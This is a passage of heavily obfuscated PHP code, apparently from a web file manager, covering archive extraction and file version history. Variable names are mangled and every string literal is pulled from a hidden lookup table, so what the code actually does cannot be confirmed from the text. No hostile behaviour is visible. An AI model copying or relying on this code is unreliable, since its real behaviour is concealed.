substr($ºÎï±–ñ[$ßÉ¼ñÊ[32]], -1, 1) == $ßÉ¼ñÊ[8]) { $àŸ‚â»Ë = $÷ÊÇ¬™[$ßÉ¼ñÊ[1248]] . rand_string(10) . $ßÉ¼ñÊ[8]; mk_dir($àŸ‚â»Ë); $»ŒŸÚ‚• = count($÷ÊÇ¬™[$ßÉ¼ñÊ[1246]]) == 1 ? IO::ext($÷óó«®ï) : get_path_ext($÷ÊÇ¬™[$ßÉ¼ñÊ[231]]); $·û¾í¾± = KodArchive::extract(self::iconvSystem($÷ÊÇ¬™[$ßÉ¼ñÊ[231]]), $àŸ‚â»Ë, $ºÎï±–ñ[$ßÉ¼ñÊ[1247]], $ûê‰¶ÕÈ, $»ŒŸÚ‚•); self::unzipErrorCheck($·û¾í¾±, array($ßÉ¼ñÊ[1249], $÷óó«®ï, $»ŒŸÚ‚•, $µ›„ë», $÷ÊÇ¬™)); Hook::trigger($ßÉ¼ñÊ[1250], $àŸ‚â»Ë); recursion_dir($àŸ‚â»Ë, $ğºÈß¿Š, $íïª€÷’, 0); $Ê«Šµ„¢ = array_merge($ğºÈß¿Š, $íïª€÷’); $Ò¿•½ã = array(); foreach ($Ê«Šµ„¢ as $¿•ŸĞÁ) { $êÚåŸ´Õ = IO::move(self::iconvApp($¿•ŸĞÁ), $µ›„ë», $³Á‹­Ÿà); if ($êÚåŸ´Õ) { $Ò¿•½ã[] = $êÚåŸ´Õ; } } del_dir($àŸ‚â»Ë); } else { $êÚåŸ´Õ = IO::move($÷ÊÇ¬™[$ßÉ¼ñÊ[231]], $µ›„ë», $³Á‹­Ÿà, get_path_this($ºÎï±–ñ[$ßÉ¼ñÊ[32]])); if ($êÚåŸ´Õ) { $Ò¿•½ã[] = $êÚåŸ´Õ; } } return $Ò¿•½ã ? $Ò¿•½ã : !1; } public static function unzipList($Ù§½‰Ÿ‘) { $Ç¢‹¾µ˜ =& $_SERVER[Ñ¯©ç]; $­Î³îıñ = isset($Ù§½‰Ÿ‘[$Ç¢‹¾µ˜[1251]]) ? $Ù§½‰Ÿ‘[$Ç¢‹¾µ˜[1251]] : !1; $ŠÁ¯Üô = isset($Ù§½‰Ÿ‘[$Ç¢‹¾µ˜[1247]]) ? @json_decode($Ù§½‰Ÿ‘[$Ç¢‹¾µ˜[1247]], !0) : -1; $½ˆ””—× = self::unzipPart($Ù§½‰Ÿ‘[$Ç¢‹¾µ˜[97]], $ŠÁ¯Üô); if (!$½ˆ””—× || !IO::exist($½ˆ””—×[$Ç¢‹¾µ˜[231]])) { show_json(LNG($Ç¢‹¾µ˜[118]), !1); } $Ö¨†ÔÂİ = $½ˆ””—×[$Ç¢‹¾µ˜[1246]][count($½ˆ””—×[$Ç¢‹¾µ˜[1246]]) - 1]; $¬š±¢ƒå = in_array(IO::ext($½ˆ””—×[$Ç¢‹¾µ˜[231]]), array($Ç¢‹¾µ˜[373], $Ç¢‹¾µ˜[1252], $Ç¢‹¾µ˜[1253], $Ç¢‹¾µ˜[1254], $Ç¢‹¾µ˜[1255], $Ç¢‹¾µ˜[1256])); if (!$­Î³îıñ && ($Ö¨†ÔÂİ[$Ç¢‹¾µ˜[1247]] == -1 || $¬š±¢ƒå)) { $ĞĞº·óã = $½ˆ””—×[$Ç¢‹¾µ˜[1248]] . get_path_this($½ˆ””—×[$Ç¢‹¾µ˜[231]]) . $Ç¢‹¾µ˜[1257]; if (!IO::exist($ĞĞº·óã)) { $¦û’ûÛ = $Ö¨†ÔÂİ[$Ç¢‹¾µ˜[1247]] == -1 ? get_path_ext(IO::pathThis($Ù§½‰Ÿ‘[$Ç¢‹¾µ˜[97]])) : get_path_ext($½ˆ””—×[$Ç¢‹¾µ˜[231]]); $¬€óğ¹ = KodArchive::listContent(self::iconvSystem($½ˆ””—×[$Ç¢‹¾µ˜[231]]), !0, $¦û’ûÛ); self::unzipErrorCheck($¬€óğ¹, array($Ç¢‹¾µ˜[1258], $Ù§½‰Ÿ‘, $½ˆ””—×)); @file_put_contents($ĞĞº·óã, json_encode($¬€óğ¹[$Ç¢‹¾µ˜[1259]])); } return @json_decode(IO::getContent($ĞĞº·óã), !0); } IO::fileOut($½ˆ””—×[$Ç¢‹¾µ˜[231]], $­Î³îıñ, get_path_this($Ö¨†ÔÂİ[$Ç¢‹¾µ˜[32]])); die; } private static function zipFileList($ßš¶€ , $ó±ìúÇ• = false) { $‰î™±ƒ =& $_SERVER[Ñ¯©ç]; $™€”ñ¼á = array(); foreach ($ßš¶€  as $Çñ†ş¤”) { $¿†ê£Î = $Çñ†ş¤”[$‰î™±ƒ[97]]; if ($ó±ìúÇ•) { $¿†ê£Î = self::copy($Çñ†ş¤”[$‰î™±ƒ[97]], $ó±ìúÇ•, $‰î™±ƒ[870]); } else { $õ©¥ÏåÙ = self::init($Çñ†ş¤”[$‰î™±ƒ[97]]); if ($õ©¥ÏåÙ->getType() == $‰î™±ƒ[119]) { $¿†ê£Î = $õ©¥ÏåÙ->path; } } if ($¿†ê£Î && self::local()->exist($¿†ê£Î)) { $™€”ñ¼á[$Çñ†ş¤”[$‰î™±ƒ[97]]] = $¿†ê£Î; } } if (!empty($™€”ñ¼á)) { return array_values($™€”ñ¼á); } show_json(LNG($‰î™±ƒ[1221]), !1); } private static function localFilePath($¸å”ò) { $¬üÛúÊŸ =& $_SERVER[Ñ¯©ç]; $Íæ¼°½ = KodIO::parse($¸å”ò); if ($Íæ¼°½[$¬üÛúÊŸ[33]] == KodIO::KOD_SOURCE) { $ü¦Îø©Á = Model($¬üÛúÊŸ[877])->fileInfoGet(KodIO::sourceID($¸å”ò)); if (!$ü¦Îø©Á[$¬üÛúÊŸ[97]]) { show_json($¬üÛúÊŸ[1260], !1); } $¸å”ò = $ü¦Îø©Á[$¬üÛúÊŸ[97]]; } $ÖÑ£Š± = self::init($¸å”ò); if ($ÖÑ£Š±->pathParse[$¬üÛúÊŸ[1207]]) { $¸å”ò = $ÖÑ£Š±->pathParse[$¬üÛúÊŸ[1207]]; $ÖÑ£Š± = self::init($¸å”ò); } $‘¼øŒñ = $ÖÑ£Š±->getType(); if ($‘¼øŒñ == $¬üÛúÊŸ[119] || $‘¼øŒñ == $¬üÛúÊŸ[1261]) { if (!$ÖÑ£Š±->exist($ÖÑ£Š±->path)) { show_json(LNG($¬üÛúÊŸ[118]), !1); } return $ÖÑ£Š±->path; } return !1; } public static function unzipPart($°ø½à‘ï, $æèïšÖ¹ = -1) { $œ©Â›òå =& $_SERVER[Ñ¯©ç]; $¦Ô–×¾– = IO::pathThis($°ø½à‘ï); if (!$æèïšÖ¹ || $æèïšÖ¹ == -1) { $çÖ©´çõ = array(array($œ©Â›òå[32] => $¦Ô–×¾–, $œ©Â›òå[1247] => -1)); $çÖ©´çõ[0][$œ©Â›òå[1262]] = $çÖ©´çõ[0][$œ©Â›òå[32]]; } else { if (is_array($æèïšÖ¹)) { $çÖ©´çõ = $æèïšÖ¹; $³ªÆø‹ = count($çÖ©´çõ) - 1; for ($¥‚ğÑ” = 0; $¥‚ğÑ” <= $³ªÆø‹; $¥‚ğÑ”++) { $«¼üœœÁ = $çÖ©´çõ[$¥‚ğÑ”]; $£‡¥ŞÈ† = get_path_this($«¼üœœÁ[$œ©Â›òå[32]]) . (checkExtSafe($«¼üœœÁ[$œ©Â›òå[32]]) ? $œ©Â›òå[12] : $œ©Â›òå[1263]); $çÖ©´çõ[$¥‚ğÑ”][$œ©Â›òå[1262]] = $œ©Â›òå[1264] . intval($«¼üœœÁ[$œ©Â›òå[1247]]) . $œ©Â›òå[445] . $£‡¥ŞÈ†; if ($¥‚ğÑ” == 0) { continue; } $çÖ©´çõ[$¥‚ğÑ”][$œ©Â›òå[1262]] = $çÖ©´çõ[$¥‚ğÑ” - 1][$œ©Â›òå[1262]] . $œ©Â›òå[1265] . $çÖ©´çõ[$¥‚ğÑ”][$œ©Â›òå[1262]]; } } } if (!is_array($çÖ©´çõ) || count($çÖ©´çõ) == 0) { return !1; } $¡¸¯“šö = $çÖ©´çõ[count($çÖ©´çõ) - 1]; if (!IO::exist($°ø½à‘ï)) { return !1; } $÷è ÷Ş = TEMP_FILES . $œ©Â›òå[1266] . kodIO::hashPathSafe($°ø½à‘ï) . $œ©Â›òå[8]; $ĞŠ²íˆ = $÷è ÷Ş . $¡¸¯“šö[$œ©Â›òå[1262]]; mk_dir($÷è ÷Ş); file_put_contents(TEMP_FILES . $œ©Â›òå[1241], $œ©Â›òå[12]); if (IO::exist($ĞŠ²íˆ)) { return array($œ©Â›òå[231] => $ĞŠ²íˆ, $œ©Â›òå[1246] => $çÖ©´çõ, $œ©Â›òå[1248] => $÷è ÷Ş); } $ç•â„èá = self::localFilePath($°ø½à‘ï); if (!$ç•â„èá) { $ç•â„èá = $÷è ÷Ş . $œ©Â›òå[1267]; if (!IO::exist($ç•â„èá)) { self::copy($°ø½à‘ï, $÷è ÷Ş, !1, get_path_this($ç•â„èá)); } } if (!$ç•â„èá || !IO::exist($ç•â„èá)) { return !1; } if ($¡¸¯“šö[$œ©Â›òå[1247]] == -1) { return array($œ©Â›òå[231] => $ç•â„èá, $œ©Â›òå[1246] => $çÖ©´çõ, $œ©Â›òå[1248] => $÷è ÷Ş); } $îæë±öê = $ç•â„èá; foreach ($çÖ©´çõ as $¥‚ğÑ” => $«¼üœœÁ) { if (!$«¼üœœÁ || $«¼üœœÁ[$œ©Â›òå[1247]] == $œ©Â›òå[1245]) { break; } if (substr($«¼üœœÁ[$œ©Â›òå[32]], -1, 1) == $œ©Â›òå[8]) { break; } $Øš‹œ¤ = in_array(get_path_ext($«¼üœœÁ[$œ©Â›òå[1262]]), array($œ©Â›òå[373], $œ©Â›òå[1252], $œ©Â›òå[1253], $œ©Â›òå[1254], $œ©Â›òå[1255], $œ©Â›òå[1256])); $”Á‘„×„ = $¥‚ğÑ” == count($çÖ©´çõ) - 1 && $Øš‹œ¤; $Œ«±…Ú¯ = $÷è ÷Ş . $«¼üœœÁ[$œ©Â›òå[1262]]; $Ãè¸ŠÆ† = $÷è ÷Ş . get_path_this($«¼üœœÁ[$œ©Â›òå[32]]); if (IO::exist($Œ«±…Ú¯)) { $îæë±öê = $Œ«±…Ú¯; continue; } $£Ëùµ×ª = $¥‚ğÑ” == 0 ? get_path_ext($¦Ô–×¾–) : get_path_ext($îæë±öê); $È´ˆ…€ï = KodArchive::extract(self::iconvSystem($îæë±öê), $÷è ÷Ş, $«¼üœœÁ[$œ©Â›òå[1247]], $·¦º¼³³, $£Ëùµ×ª); self::unzipErrorCheck($È´ˆ…€ï, array($œ©Â›òå[1268], $°ø½à‘ï, $çÖ©´çõ, $«¼üœœÁ, $Œ«±…Ú¯)); if (IO::exist($Ãè¸ŠÆ†)) { IO::rename($Ãè¸ŠÆ†, get_path_this($Œ«±…Ú¯)); } $îæë±öê = $Œ«±…Ú¯; } $ĞŠ²íˆ = $îæë±öê; return array($œ©Â›òå[231] => $îæë±öê, $œ©Â›òå[1246] => $çÖ©´çõ, $œ©Â›òå[1248] => $÷è ÷Ş); } private static function unzipErrorCheck($âíñ³šÃ, $–Ø©áë’ = false) { $Ğ­ì®• =& $_SERVER[Ñ¯©ç]; if ($âíñ³šÃ[$Ğ­ì®•[1269]]) { return !0; } write_log(array($Ğ­ì®•[1270], $âíñ³šÃ, $–Ø©áë’), $Ğ­ì®•[1271]); show_json($Ğ­ì®•[1272] . json_encode($âíñ³šÃ[$Ğ­ì®•[1259]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¶ÑÚ¥ø³ =& $_SERVER[Ñ¯©ç]; $®‚í ¹á = $GLOBALS[$¶ÑÚ¥ø³[6]][$¶ÑÚ¥ø³[102]]; if ($®‚í ¹á[$¶ÑÚ¥ø³[1273]] != 1) { return; } if ($®‚í ¹á[$¶ÑÚ¥ø³[1274]] <= 0) { return; } if (isset($_REQUEST[$¶ÑÚ¥ø³[1275]]) && $_REQUEST[$¶ÑÚ¥ø³[1275]] == $¶ÑÚ¥ø³[101]) { return; } Hook::bind($¶ÑÚ¥ø³[1276], $¶ÑÚ¥ø³[1277]); Hook::bind($¶ÑÚ¥ø³[1278], $¶ÑÚ¥ø³[1279]); Hook::bind($¶ÑÚ¥ø³[1280], $¶ÑÚ¥ø³[1281]); Hook::bind($¶ÑÚ¥ø³[1282], $¶ÑÚ¥ø³[1283]); Hook::bind($¶ÑÚ¥ø³[1284], $¶ÑÚ¥ø³[1285]); Hook::bind($¶ÑÚ¥ø³[1286], $¶ÑÚ¥ø³[1287]); } public static function eventBeforeUpload($…Ù”ËŠ“) { if ($…Ù”ËŠ“[3] && $…Ù”ËŠ“[3] != REPEAT_REPLACE) { return; } $”â¯¹–¦ = self::parsePath($…Ù”ËŠ“[0]); if (!$”â¯¹–¦) { return; } self::add($”â¯¹–¦); } public static function eventBeforeEdit($°ú´¢Œ) { $ÍÙ¾¤ÛÆ = self::parsePath($°ú´¢Œ[0]); if (!$ÍÙ¾¤ÛÆ) { return; } self::add($ÍÙ¾¤ÛÆ); } public static function eventBeforeCopyFile($°óë­ÀÏ, $ÅÀé”–ƒ, $øğó®Óå, $´Ùóå ™, $ÅŒ·’ŒÈ, $ß¹¾·ìÎ) { $±ñÑ± =& $_SERVER[Ñ¯©ç]; if (isset($øğó®Óå->_data[$±ñÑ±[1211]]) && $øğó®Óå->_data[$±ñÑ±[1211]]) { return; } $ÂæÜ³Éœ = $øğó®Óå->getPathOuter($´Ùóå ™); $Ä¡ß“¦• = self::parsePath($ÂæÜ³Éœ); if (!$Ä¡ß“¦•) { return; } self::add($Ä¡ß“¦•); } public static function eventBeforeRename($ôµ×ÖÚË) { $›æÍÔ•œ =& $_SERVER[Ñ¯©ç]; $í×ñŸÁÏ = self::parsePath($ôµ×ÖÚË[0]); if (!$í×ñŸÁÏ) { return; } $šÈşóë‰ = self::checkInHistory($í×ñŸÁÏ); if (!$šÈşóë‰) { return; } if ($šÈşóë‰[$›æÍÔ•œ[33]] == $›æÍÔ•œ[231]) { $üâ½Ö£Ê = self::listData($í×ñŸÁÏ); if ($üâ½Ö£Ê && $üâ½Ö£Ê[$›æÍÔ•œ[429]]) { self::moveHistory($í×ñŸÁÏ, $ôµ×ÖÚË[1]); } } else { IO::rename($šÈşóë‰[$›æÍÔ•œ[97]], $ôµ×ÖÚË[1]); } } public static function eventBeforeMove($ÙÕÒ€Æ¤) { $Ûï¬ÉêÅ =& $_SERVER[Ñ¯©ç]; $ñ—éİÇ = self::parsePath($ÙÕÒ€Æ¤[0]); if (!$ñ—éİÇ) { return; } $Ëù¹€Áî = self::parsePath($ÙÕÒ€Æ¤[1]); if (!$Ëù¹€Áî) { return; } $…”ñ¬¨¾ = $ÙÕÒ€Æ¤[3]; $ü‰¶Œ¿é = self::checkInHistory($ñ—éİÇ); if (!$ü‰¶Œ¿é) { return; } $‚ÀÔ¨ÊÀ = self::pathHistory($Ëù¹€Áî); if ($ü‰¶Œ¿é[$Ûï¬ÉêÅ[33]] == $Ûï¬ÉêÅ[231]) { $ˆîÜšÆ = self::listData($ñ—éİÇ); $Ö“•ÙÒ = rtrim($Ëù¹€Áî, $Ûï¬ÉêÅ[8]) . $Ûï¬ÉêÅ[8] . ($…”ñ¬¨¾ ? $…”ñ¬¨¾ : get_path_this($ñ—éİÇ)); $‚¡¨Û’Ş = self::listData($Ö“•ÙÒ); if ($ˆîÜšÆ && $ˆîÜšÆ[$Ûï¬ÉêÅ[429]] && $‚¡¨Û’Ş && $‚¡¨Û’Ş[$Ûï¬ÉêÅ[429]]) { return self::clear($ñ—éİÇ); } if ($ˆîÜšÆ && $ˆîÜšÆ[$Ûï¬ÉêÅ[429]]) { self::moveHistory($ñ—éİÇ, $…”ñ¬¨¾, $‚ÀÔ¨ÊÀ); } } else { IO::move($ü‰¶Œ¿é[$Ûï¬ÉêÅ[97]], $‚ÀÔ¨ÊÀ, !1, $…”ñ¬¨¾); self::clearEmptyFolder(IO::pathFather($ü‰¶Œ¿é[$Ûï¬ÉêÅ[97]])); } } public static function eventAfterRemove($Á¯’¢³ú, $ĞŸÆÁéè) { $ãíÆˆ€ =& $_SERVER[Ñ¯©ç]; if (!$ĞŸÆÁéè) { return; } $’ö­ª† = self::parsePath($Á¯’¢³ú[0]); if (!$’ö­ª†) { return; } $£™…‡¼Ç = self::checkInHistory($’ö­ª†); if (!$£™…‡¼Ç) { return; } if ($£™…‡¼Ç[$ãíÆˆ€[33]] == $ãíÆˆ€[231]) { $ò…ñª¥î = self::listData($’ö­ª†, !1); if ($ò…ñª¥î && $ò…ñª¥î[$ãíÆˆ€[429]]) { self::clear($’ö­ª†, !1); } } else { IO::remove($£™…‡¼Ç[$ãíÆˆ€[97]]); self::clearEmptyFolder(IO::pathFather($£™…‡¼Ç[$ãíÆˆ€[97]])); } } private static function checkInHistory($ÀäÄ§àş) { $Š‚¼§ê· = self::pathHistory($ÀäÄ§àş); if (!IO::exist($Š‚¼§ê·)) { $Š‚¼§ê· .= $_SERVER[Ñ¯©ç][1288]; } return IO::exist($Š‚¼§ê·) ? IO::info($Š‚¼§ê·) : !1; } private static function parsePath($±¢áÀıÜ) { $à½®‹øô =& $_SERVER[Ñ¯©ç]; if (!$±¢áÀıÜ) { return !1; } if (isset($GLOBALS[$à½®‹øô[1289]]) && $GLOBALS[$à½®‹øô[1289]]) { return; } $¥‘²¤ö‚ = KodIO::parse($±¢áÀıÜ); $Ï¶×‘£— = $¥‘²¤ö‚[$à½®‹øô[33]]; $·²Åá„Ä = !$Ï¶×‘£— || $Ï¶×‘£— == KodIO::KOD_IO || $Ï¶×‘£— == KodIO::KOD_SHARE_ITEM; if (!$·²Åá„Ä || !$¥‘²¤ö‚[$à½®‹øô[1290]]) { return !1; } if (substr($±¢áÀıÜ, 0, strlen(DATA_PATH . $à½®‹øô[1291])) == DATA_PATH . $à½®‹øô[1291]) { return !1; } if ($Ï¶×‘£— == KodIO::KOD_SHARE_ITEM) { $ÌÒ¼şÄ× = IO::init($±¢áÀıÜ); if ($ÌÒ¼şÄ×->pathParse[$à½®‹øô[1207]]) { return self::parsePath($ÌÒ¼şÄ×->pathParse[$à½®‹øô[1207]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $©ŸˆÀø = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $à½®‹øô[1292]); foreach ($©ŸˆÀø as $›‘É·µ) { if (!$Ï¶×‘£— && substr($±¢áÀıÜ, 0, strlen($›‘É·µ)) == $›‘É·µ) { return !1; } } self::log($GLOBALS[$à½®‹øô[1202]] . $à½®‹øô[1293] . $±¢áÀıÜ); return $±¢áÀıÜ; } private static function pathHistory($’©¨àäÙ) { $´˜éŞÜõ =& $_SERVER[Ñ¯©ç]; $¡Ü´¯½Î = self::$_historyBase . ltrim(KodIO::clear($’©¨àäÙ), $´˜éŞÜõ[8]); $¡Ü´¯½Î = str_replace(array($´˜éŞÜõ[1294]), array($´˜éŞÜõ[1295]), $¡Ü´¯½Î); return $¡Ü´¯½Î; } public static function log($Ú¥Ü†²Ù) { } public static function historyCount($˜ò˜î²§) { $®ĞÄ…¾€ =& $_SERVER[Ñ¯©ç]; $–ãİÊïÒ = array(); $—é÷ï¹ = array(); foreach ($˜ò˜î²§ as $€ĞşæÓê) { $¡ØùÓ = get_path_father($€ĞşæÓê); if (!$—é÷ï¹[$¡ØùÓ]) { $—é÷ï¹[$¡ØùÓ] = array(); } $—é÷ï¹[$¡ØùÓ][] = get_path_this($€ĞşæÓê); } foreach ($—é÷ï¹ as $¡ØùÓ => $ñ¢Ñ¨ã) { $©¤Ê¯³ = self::parsePath($¡ØùÓ); if (!$©¤Ê¯³) { continue; } foreach ($ñ¢Ñ¨ã as $âÑøù¢œ) { $ªæ…üî· = self::listData(rtrim($©¤Ê¯³, $®ĞÄ…¾€[8]) . $®ĞÄ…¾€[8] . $âÑøù¢œ, !1); if ($ªæ…üî· && $ªæ…üî·[$®ĞÄ…¾€[429]]) { $–ãİÊïÒ[rtrim($¡ØùÓ, $®ĞÄ…¾€[8]) . $®ĞÄ…¾€[8] . $âÑøù¢œ] = count($ªæ…üî·[$®ĞÄ…¾€[429]]); } } } return $–ãİÊïÒ; } public static function add($¹Ê‹Ö«”) { $„­©•Ê† =& $_SERVER[Ñ¯©ç]; $ãÎ¶¾¤• = self::listData($¹Ê‹Ö«”); if (!$ãÎ¶¾¤•) { return; } $Ğú§Ø¶È = Model($„­©•Ê†[823])->get($„­©•Ê†[1296]); $¹ÉªÈÁ = intval($GLOBALS[$„­©•Ê†[6]][$„­©•Ê†[102]][$„­©•Ê†[1274]]); $¡•í›§› = $Ğú§Ø¶È == $„­©•Ê†[1297] ? min(5, $¹ÉªÈÁ) : $¹ÉªÈÁ; if ($¹ÉªÈÁ <= 0) { return; } $õ·›«¤ = IO::info($¹Ê‹Ö«”); $‡—¢‹­ı = $ãÎ¶¾¤•[$„­©•Ê†[429]]; if ($õ·›«¤[$„­©•Ê†[89]] == 0) { return; } if ($õ·›«¤[$„­©•Ê†[89]] >= 1024 * 1024 * 500) { return !1; } $ŒöóËÁê = IO::hashSimple($¹Ê‹Ö«”); if ($‡—¢‹­ı && $‡—¢‹­ı[0][$„­©•Ê†[655]] == $ŒöóËÁê) { return !0; } if (array_key_exists($„­©•Ê†[234], $õ·›«¤) && !$õ·›«¤[$„­©•Ê†[234]]) { return !1; } $Ş«ŒÅµ× = short_id(time()); $§ó½’¢Ã = array($„­©•Ê†[458] => $Ş«ŒÅµ×, $„­©•Ê†[655] => $ŒöóËÁê, $„­©•Ê†[32] => $õ·›«¤[$„­©•Ê†[32]] . $„­©•Ê†[10] . date($„­©•Ê†[1298]) . rand_string(1), $„­©•Ê†[89] => $õ·›«¤[$„­©•Ê†[89]], $„­©•Ê†[510] => USER_ID, $„­©•Ê†[232] => time(), $„­©•Ê†[1299] => $„­©•Ê†[12]); IO::mkdir($ãÎ¶¾¤•[$„­©•Ê†[1300]]); $¹ÖÍ·— = IO::copy($¹Ê‹Ö«”, $ãÎ¶¾¤•[$„­©•Ê†[1300]], !1, $§ó½’¢Ã[$„­©•Ê†[32]]); if (!$¹ÖÍ·—) { self::clearEmptyFolder($ãÎ¶¾¤•[$„­©•Ê†[1300]]); return !1; } array_unshift($‡—¢‹­ı, $§ó½’¢Ã); if (count($‡—¢‹­ı) > $¡•í›§›) { $¦¸Á‰§— = array_slice($‡—¢‹­ı, $¡•í›§›); foreach ($¦¸Á‰§— as $öĞÉ·£Ô) { IO::remove($ãÎ¶¾¤•[$„­©•Ê†[1300]] . $öĞÉ·£Ô[$„­©•Ê†[32]]); } $‡—¢‹­ı = array_slice($‡—¢‹­ı, 0, $¡•í›§›); } return self::saveData($ãÎ¶¾¤•[$„­©•Ê†[1301]], $‡—¢‹­ı); } public static function remove($â‹ôõÆÍ, $¢àŠŸ …) { $¥÷”Åú† =& $_SERVER[Ñ¯©ç]; $ÔôÍ°Ø = self::listData($â‹ôõÆÍ); $›íÅüŠ = array(); if (!$ÔôÍ°Ø) { return !1; } foreach ($ÔôÍ°Ø[$¥÷”Åú†[429]] as $¸ÏÉ‘ª) { if ($¸ÏÉ‘ª[$¥÷”Åú†[458]] == $¢àŠŸ …) { IO::remove($ÔôÍ°Ø[$¥÷”Åú†[1300]] . $¸ÏÉ‘ª[$¥÷”Åú†[32]]); continue; } $›íÅüŠ[] = $¸ÏÉ‘ª; } return self::saveData($ÔôÍ°Ø[$¥÷”Åú†[1301]], $›íÅüŠ); } public static function clear($¿šÍØûâ, $—ü¦â¿Î = true) { $¨—¥‘Ÿ£ =& $_SERVER[Ñ¯©ç]; $©£†‘Ïü = self::listData($¿šÍØûâ, $—ü¦â¿Î); if (!$©£†‘Ïü) { return !1; } foreach ($©£†‘Ïü[$¨—¥‘Ÿ£[429]] as $şæ—µ—Ñ) { IO::remove($©£†‘Ïü[$¨—¥‘Ÿ£[1300]] . $şæ—µ—Ñ[$¨—¥‘Ÿ£[32]]); } return self::saveData($©£†‘Ïü[$¨—¥‘Ÿ£[1301]], array()); } public static function moveHistory($½â„ÎßÎ, $úÇ´ã€Ò = '', $òœ÷Ë³¤ = '') { $šàßü»• =& $_SERVER[Ñ¯©ç]; $«ˆ¾âÓ = self::listData($½â„ÎßÎ, !1); if (!$«ˆ¾âÓ || !$«ˆ¾âÓ[$šàßü»•[429]]) { return !1; } $€óÔ×¡Í = $šàßü»•[1288]; $úÇ´ã€Ò = $úÇ´ã€Ò ? $úÇ´ã€Ò : get_path_this($½â„ÎßÎ); $òœ÷Ë³¤ = $òœ÷Ë³¤ ? $òœ÷Ë³¤ : $«ˆ¾âÓ[$šàßü»•[1300]]; $É¼¾Š€ = substr(get_path_this($«ˆ¾âÓ[$šàßü»•[1301]]), 0, -strlen($€óÔ×¡Í)); foreach ($«ˆ¾âÓ[$šàßü»•[429]] as $Õ¥÷«•À => $”Û¨¡‘) { $‡¢ŒÍ˜ˆ = $úÇ´ã€Ò . substr($”Û¨¡‘[$šàßü»•[32]], strlen($É¼¾Š€)); $ôÖ´‰÷¶ = IO::move($«ˆ¾âÓ[$šàßü»•[1300]] . $”Û¨¡‘[$šàßü»•[32]], $òœ÷Ë³¤, !1, $‡¢ŒÍ˜ˆ); if ($ôÖ´‰÷¶) { $«ˆ¾âÓ[$šàßü»•[429]][$Õ¥÷«•À][$šàßü»•[32]] = $‡¢ŒÍ˜ˆ; } } $«ˆ¾âÓ[$šàßü»•[1301]] = IO::move($«ˆ¾âÓ[$šàßü»•[1301]], $òœ÷Ë³¤, !1, $úÇ´ã€Ò . $€óÔ×¡Í); self::saveData($«ˆ¾âÓ[$šàßü»•[1301]], $«ˆ¾âÓ[$šàßü»•[429]]); self::clearEmptyFolder($«ˆ¾âÓ[$šàßü»•[1300]]); } public static function rollback($¶®¨Ä³, $‹ıíÃèè) { $Á¥ÍÅæ§ =& $_SERVER[Ñ¯©ç]; $ğ„Èß¢¹ = self::listData($¶®¨Ä³); if (!$ğ„Èß¢¹) { return; } $šÔÄóÔà = IO::info($¶®¨Ä³); foreach ($ğ„Èß¢¹[$Á¥ÍÅæ§[429]] as $×‡¶Ú˜° => $Šùò…ü) { if ($Šùò…ü[$Á¥ÍÅæ§[458]] == $‹ıíÃèè) { self::add($¶®¨Ä³); $˜ÉÃ¶– = $ğ„Èß¢¹[$Á¥ÍÅæ§[1300]] . $Šùò…ü[$Á¥ÍÅæ§[32]]; $åúù¾‘¹ = IO::copy($˜ÉÃ¶–, IO::pathFather($¶®¨Ä³), REPEAT_REPLACE, $šÔÄóÔà[$Á¥ÍÅæ§[32]]); if ($åúù¾‘¹) { self::remove($¶®¨Ä³, $‹ıíÃèè); } return $åúù¾‘¹; } } return !1; } public static function setDetail($Õ¹¶…şà, $¤Ëòø·ä, $×´†…ÖÂ) { $½˜°¼ı =& $_SERVER[Ñ¯©ç]; $§şïá›» = self::listData($Õ¹¶…şà); if (!$§şïá›») { return; } foreach ($§şïá›»[$½˜°¼ı[429]] as $üñìèô— => $ÎĞá±ıÆ) { if ($ÎĞá±ıÆ[$½˜°¼ı[458]] == $¤Ëòø·ä) { $§şïá›»[$½˜°¼ı[429]][$üñìèô—][$½˜°¼ı[1299]] = $×´†…ÖÂ; self::saveData($§şïá›»[$½˜°¼ı[1301]], $§şïá›»[$½˜°¼ı[429]]); return !0; } } return !1; } public static function fileInfo($—§¶à–ı, $ù¢€½óê) { $ÎÌ¥ùÈî =& $_SERVER[Ñ¯©ç]; $ÁÜÊƒ¦´ = self::listData($—§¶à–ı); if (!$ÁÜÊƒ¦´) { show_json(LNG($ÎÌ¥ùÈî[118]), !1); } $íŞÔˆñ­ = $ÎÌ¥ùÈî[12]; foreach ($ÁÜÊƒ¦´[$ÎÌ¥ùÈî[429]] as $úš«¨Ø => $Æ»ƒ„å§) { if ($Æ»ƒ„å§[$ÎÌ¥ùÈî[458]] != $ù¢€½óê) { continue; } $íŞÔˆñ­ = $ÁÜÊƒ¦´[$ÎÌ¥ùÈî[1300]] . $Æ»ƒ„å§[$ÎÌ¥ùÈî[32]]; break; } if (!$íŞÔˆñ­) { show_json(LNG($ÎÌ¥ùÈî[118]), !1); } return IO::info($íŞÔˆñ­); } public static function fileOut($Ò­¬óŸ, $öû’¶¦ñ, $±úÇ–‚ = false) { $Ô¢ÑÔ¾Œ =& $_SERVER[Ñ¯©ç]; $‹Ìı½Á© = self::fileInfo($Ò­¬óŸ, $öû’¶¦ñ); $èğâ™ÌÅ =& $GLOBALS[$Ô¢ÑÔ¾Œ[7]]; $±úÇ–‚ = isset($èğâ™ÌÅ[$Ô¢ÑÔ¾Œ[1251]]) && $èğâ™ÌÅ[$Ô¢ÑÔ¾Œ[1251]] == 1; if (isset($èğâ™ÌÅ[$Ô¢ÑÔ¾Œ[33]]) && $èğâ™ÌÅ[$Ô¢ÑÔ¾Œ[33]] == $Ô¢ÑÔ¾Œ[1302]) { return IO::fileOutImage($‹Ìı½Á©[$Ô¢ÑÔ¾Œ[97]], $èğâ™ÌÅ[$Ô¢ÑÔ¾Œ[1303]]); } IO::fileOut($‹Ìı½Á©[$Ô¢ÑÔ¾Œ[97]], $±úÇ–‚, get_path_this($Ò­¬óŸ)); } public static function listData($şŠ¯ÀÂ„, $ Çì°íŠ = true) { $…ãŸƒ¡¸ =& $_SERVER[Ñ¯©ç]; if ($ Çì°íŠ && !IO::exist($şŠ¯ÀÂ„)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($şŠ¯ÀÂ„, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¸ ³×ç = self::pathHistory($şŠ¯ÀÂ„); $ú¦—Ì– = array($…ãŸƒ¡¸[1301] => $¸ 